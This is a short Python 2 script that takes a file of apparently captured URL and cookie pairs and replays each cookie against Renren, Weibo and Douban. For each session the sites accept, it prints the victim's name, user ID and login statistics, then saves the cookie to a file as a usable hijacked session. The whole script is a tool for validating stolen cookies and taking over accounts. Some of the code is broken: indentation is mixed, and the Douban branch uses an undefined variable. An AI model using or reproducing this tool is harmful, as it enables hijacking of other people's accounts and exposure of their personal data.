#!/usr/bin/python
#encoding=utf-8
import re
import urllib2
import urllib
import cookielib
renren_namelist=[]
weibo_namelist=[]
douban_namelist=[]
def renrenBrowser(cookie,f1):
	try:	
		url="http://www.renren.com"
		cookiejar=cookielib.CookieJar()
		req = urllib2.Request(url)
		req.add_header('Cookie', cookie)
		data = urllib2.urlopen(req).read()
		name_pattern=re.compile(r'(?<=<title>人人网 - )[\S]*(?=</title>)')
		name=name_pattern.search(data).group(0)
		coming_pattern=re.compile(r'(?<=最近来访<span> )[\d]+')
		coming=coming_pattern.search(data).group(0)
		consist_pattern=re.compile(r'(?<=>)[\d]+(?=天</)')
		consist=consist_pattern.search(data).group(0)
		if len([names for names in renren_namelist if names==name])==0:
			print('------RenRen account detected!------')
			print('The Name is: \t'+name)
			print('The Total view is : \t'+coming)
			print('The Total Consist Login is : \t'+consist)
			renren_namelist.append(name)
			f1.write(name+'\t'+url+'\t'+cookie+'\n')
	except Exception as e:
		pass
def weiboBrowser(cookie,f1):
	try:
		url="http://www.weibo.com"
                cookiejar=cookielib.CookieJar()
                req = urllib2.Request(url)
                req.add_header('Cookie', cookie)
                data = urllib2.urlopen(req).read()
		uid_pattern=re.compile(r'(?<=\$CONFIG\[\'uid\'\] = )[\'\d]+(?=;)')
		uid=uid_pattern.search(data).group(0)
		name_pattern=re.compile(r'(?<=\$CONFIG\[\'nick\'\] = )[\S]+(?=;)')
		name=name_pattern.search(data).group(0)
		if len([names for names in weibo_namelist if names==name])==0:
			print('++++++Weibo account Detected!++++++')
			print('Uid is : '+uid)
			print('Nick name is :'+name)
			weibo_namelist.append(name)
			f1.write(name+'\t'+url+'\t'+cookie+'\n')
	except Exception as e:
		pass
def doubanBrowser(cookie,f1):
	try:	
		url="http://www.douban.com"
                cookiejar=cookielib.CookieJar()
                req = urllib2.Request(url)
                req.add_header('Cookie', cookie)
                data = urllib2.urlopen(req).read()
		print(data)
		#uid_pattern=re.compile(r'(?<=\$CONFIG\[\'uid\'\] = )[\d]+(?=;)')
		#uid=uid_pattern.search(data).group(0)
		#name_pattern=re.compile(r'(?<=\$CONFIG\[\'nick\'\] = )[\S]+(?=;)')
		#name=name_pattern.search(data).group(0)
		#print('Weibo account Detected!')
		#print('Uid is : '+uid)
		#print('Nick name is :'+name)
		f1.write(name+'\t'+url+'\t'+cookie+'\n')
	except Exception as e:
                pass
f=open('result.txt','r')
f1=open('cookie_final.txt','aw')
for line in f:
	s=line.split('\t')
	url=s[0]
	cookie=s[1]
	domain_pattern=re.compile(r'[a-zA-Z\-\d]*.com')
	domain_group=domain_pattern.search(url)
	if domain_group:
		domain=domain_group.group(0)
		if domain=='renren.com':
			renrenBrowser(cookie,f1)
		if domain=='weibo.com':
			weiboBrowser(cookie,f1)
		if domain=='douban.com':
			doubanBrowser(cookie,f1)
f.close()
f1.close()
